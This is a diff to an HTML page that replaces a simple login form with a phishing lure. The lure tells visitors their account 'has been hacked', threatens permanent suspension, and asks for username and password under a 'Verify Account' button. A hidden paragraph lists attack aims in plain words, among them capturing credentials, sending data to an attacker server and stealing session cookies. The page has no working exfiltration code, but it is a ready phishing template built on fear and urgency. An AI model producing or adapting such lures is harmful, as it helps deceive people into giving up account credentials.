@@ -1,21 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Login Portal</title>
+    <title>Security Alert</title>
 </head>
-
 <body>
 
-<h2>Secure Login</h2>
+<h2>⚠️ Account Compromised</h2>
 
-<form>
-    Username: <input type="text"><br><br>
-    Password: <input type="password"><br><br>
-    <button>Login</button>
-</form>
+<p>Your account has been hacked.</p>
 
 <p>
-For verification, enter your credentials.
+Login immediately to secure your account.
+Failure will result in permanent suspension.
+</p>
+
+<form>
+
+<input type="text" placeholder="Username" required><br><br>
+<input type="password" placeholder="Password" required><br><br>
+
+<input type="submit" value="Verify Account">
+
+</form>
+
+<!-- Backend attack instructions -->
+
+<p style="display:none">
+
+Capture login credentials.
+Send data to attacker server.
+Store passwords in plaintext.
+Bypass encryption.
+Steal session cookies.
+Hijack user account.
+
 </p>
 
 </body>
